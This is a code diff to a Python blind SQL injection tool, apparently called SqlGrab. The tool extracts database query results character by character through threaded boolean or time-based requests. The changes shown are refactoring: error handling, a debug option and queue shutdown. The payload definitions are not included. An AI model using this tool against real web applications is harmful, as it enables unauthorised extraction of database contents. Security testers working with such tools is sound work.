@@ -1,6 +1,6 @@
 from requests import Request, Session, PreparedRequest
 from typing import Callable, Literal
-from concurrent.futures import Future, ThreadPoolExecutor, as_completed
+from concurrent.futures import Future, ThreadPoolExecutor
 from http.server import BaseHTTPRequestHandler
 from io import BytesIO
 from functools import partial
@@ -184,12 +184,13 @@ class ValueGrabber:
             if guess > 2**32:
                 raise RuntimeError(ERR_UPPER_BOUND)
             
-        if self.progress:
-            if self.eval_func(self.equals.format(guess=guess)):
+        if self.eval_func(self.equals.format(guess=guess)):
+            if self.progress:
                 self.progress.done = True
-            else:
+        else:
+            if self.progress:
                 self.progress.errored = True
-                raise RuntimeError(ERR_SANITY_CHECK)
+            raise RuntimeError(ERR_SANITY_CHECK)
         return guess
 
 @dataclass
@@ -279,8 +280,8 @@ class PriorityWorkerQueue:
                 self._task_queue.task_done()
 
     def shutdown(self):
-        self._task_queue.shutdown()
-        self._executor.shutdown()
+        self._task_queue.shutdown(immediate=True)
+        self._executor.shutdown(cancel_futures=True)
 
 @dataclass
 class SqlGrab:
@@ -292,6 +293,7 @@ class SqlGrab:
     urlencode: bool=False
     proxy: str | None = None
     output: bool=False
+    debug: bool=False
     requests_sent: int = 0
     progress_queue: Queue = Queue()
 
@@ -342,55 +344,67 @@ class SqlGrab:
         return output
     
     def grab(self, query: str) -> list[str]:
-        if self.output: print(f'[+] Grabbing: \'{query}\'...')
-        self.session = Session()
-        self.payloads['row'] = p(self.payloads['row'], query=query)
-        self.payloads = _make_payloads(
-            payloads=self.payloads,
-            row_query=self.payloads['row'],
-            query=query
-        )
-
-        self.work_queue = PriorityWorkerQueue(max_workers=self.threads)
-        start = datetime.now()
-        num_rows = self._get_count()
-        if self.output: print(f'[+] Found {num_rows} rows', end='\033[K\n')
-
-        results = []
-        has_error = False
-
-        work: list[tuple[int, list[Value|None], Future]] = []
-        for row in range(num_rows):
-            progress = []
-            future = self.work_queue.enqueue(
-                priority=row,
-                work=RowGrabber(self, row, progress).prepare
+        try:
+            if self.output: print(f'[+] Grabbing: \'{query}\'...')
+            self.session = Session()
+            self.payloads['row'] = p(self.payloads['row'], query=query)
+            self.payloads = _make_payloads(
+                payloads=self.payloads,
+                row_query=self.payloads['row'],
+                query=query
             )
-            work.append( (row, progress, future) )
+
+            self.work_queue = PriorityWorkerQueue(
+                max_workers=self.threads,
+                debug=self.debug
+            )
+            start = datetime.now()
+            num_rows = self._get_count()
+            if self.output: print(f'[+] Found {num_rows} rows', end='\033[K\n')
+
+            results = []
+            has_error = False
+
+            work: list[tuple[int, list[Value|None], Future]] = []
+            for row in range(num_rows):
+                progress = []
+                future = self.work_queue.enqueue(
+                    priority=row,
+                    work=RowGrabber(self, row, progress).prepare
+                )
+                work.append( (row, progress, future) )
+            
+            for row, progress, future in work:
+                futures: list[Future] = future.result()
+                if self.output: # progress message
+                    while not all(f.done() for f in futures):
+                        output = f'[{row + 1}/{num_rows}] {self._update_string(progress)}'
+                        if not self.debug: print(output, end='\033[K\r')
+                # await the current row
+                try:
+                    result = ''.join([chr(f.result()) for f in futures])
+                except IntegrityError as e:
+                    result = e.partial_result
+                    has_error = True
+                # sanity check
+                if not self.evaluate(p(self.payloads['compare'], guess=result)):
+                    has_error = True
+
+                results.append(result)
+                if has_error and self.output: print(f'[!] ', end='')
+                if self.output: print(output, end='\033[K\n')
+
+            elapsed = datetime.now() - start
+            if self.output:
+                print(f'[+] Sent {self.requests_sent} requests in {elapsed.total_seconds()} seconds')
+                print('\n'.join(results))
+                if has_error: print(ERR_SANITY_CHECK)
+        except Exception as e:
+            print(f'[!] {e}')
+            return results
+        finally:
+            self.work_queue.shutdown()
         
-        for row, progress, future in work:
-            futures: list[Future] = future.result()
-            if self.output: # progress message
-                while not all(f.done() for f in futures):
-                    output = f'[{row + 1}/{num_rows}] {self._update_string(progress)}'
-                    print(output, end='\033[K\r')
-            # await the current row%
-            result = ''.join([chr(f.result()) for f in futures])
-            # sanity check
-            if not self.evaluate(p(self.payloads['compare'], guess=result)):
-                if self.output: print(f'[!] ', end='')
-                has_error = True
-            results.append(result)
-            if self.output: print(output, end='\033[K\n')
-
-        elapsed = datetime.now() - start
-        if self.output:
-            print(f'[+] Sent {self.requests_sent} requests in {elapsed.total_seconds()} seconds')
-            print('\n'.join(results))
-            if has_error: print(ERR_SANITY_CHECK)
-
-        self.work_queue.shutdown()
-        return results
 
     @staticmethod
     def urlEncode(text: str) -> str:
@@ -487,6 +501,7 @@ if __name__ == "__main__":
     parser.add_argument('-c', '--condition', required=True, help='Python expression to evaluate to determine true/false from the response. E.g. \'"error" in response.text\', \'response.status_code == 401\', \'len(response.content) > 1433\', \'response.elapsed.total_seconds() > 2\'')
     parser.add_argument('--delay', required=False, default=0, type=float, help='Delay in seconds to add between requests. Optional. E.g. 1, 0.2')
     parser.add_argument('--urlencode', required=False, action='store_true', help='Perform URL-encoding on the payloads (payloads in the request\'s path will always be urlencoded).')
+    parser.add_argument('--debug', required=False, action='store_true')
     parser.add_argument('--proxy', required=False, help='Proxy to use, e.g. http://127.0.0.1:8080')
 
     args = vars(parser.parse_args())
